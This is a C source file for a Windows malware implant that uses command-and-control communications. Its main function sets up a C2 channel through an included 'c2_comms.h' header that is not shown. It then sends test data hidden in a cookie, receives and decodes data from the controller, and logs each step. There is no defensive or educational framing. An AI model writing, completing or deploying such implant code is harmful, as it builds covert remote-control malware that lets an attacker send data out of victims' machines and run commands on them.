#include <windows.h>
#include <stdlib.h>
#include <malloc.h>
#include <string.h>
#include <shlwapi.h>
#include <processthreadsapi.h>

#include "c2_comms.h"

#pragma comment(lib, "Shlwapi.lib")
#pragma comment(lib, "Advapi32.lib")
#pragma comment(lib, "Pathcch.lib")

// Global heap handle
HANDLE heap;

// Present working directory, globally accessible
char pwd[MAX_PATH + 1] = {0};
 



// cl implant.c  /Fe:implant.exe /DDEBUG -Zi /DEBUG
// cl implant.c /Fe:implant.exe
int main() {
    int status = 0;
    unsigned int len = 0;
    char buffer[1024] = {0};


    // Basic setup
    status = SetupComms();
    if (status < 0) {
        c2_log("[!] ERROR in comms setup\n");
        TearDownComms();
        return -1;
    }
    c2_log("[+] Comms setup sucessfully\n");
    heap = GetProcessHeap();


    // Test send cookie data
    char* data = "!text to base64 encode!";
    len = c2_send(data, strlen(data));
    if (len == 0) {
        c2_log("[!] cookie send failed\n");
        return -1;
    }


    // Test recieve data
    len = c2_recv(buffer, 1024);
    if (len == 0) {
        c2_log("[!] data recv failed\n");
    }
    else {
        c2_log("[+] DECODED: %s\n", buffer);
    }





    TearDownComms();
    return 0;
}
